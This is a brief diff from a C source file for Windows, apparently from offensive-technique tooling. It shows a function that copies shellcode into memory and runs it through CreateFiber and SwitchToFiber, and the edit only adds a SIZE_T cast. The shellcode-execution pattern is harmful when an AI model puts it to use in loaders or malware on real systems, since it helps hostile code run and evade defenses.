@@ -12,7 +12,7 @@ VOID ExecuteModuleShellcodeUsingFiber()
 	memcpy(shellcodeLocation, shellcode, sizeof(shellcode));
 
 	// create a fiber that will execute the shellcode
-	PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
+	PVOID shellcodeFiber = CreateFiber((SIZE_T)NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
 
 	// manually schedule the fiber that will execute our shellcode
 	SwitchToFiber(shellcodeFiber);
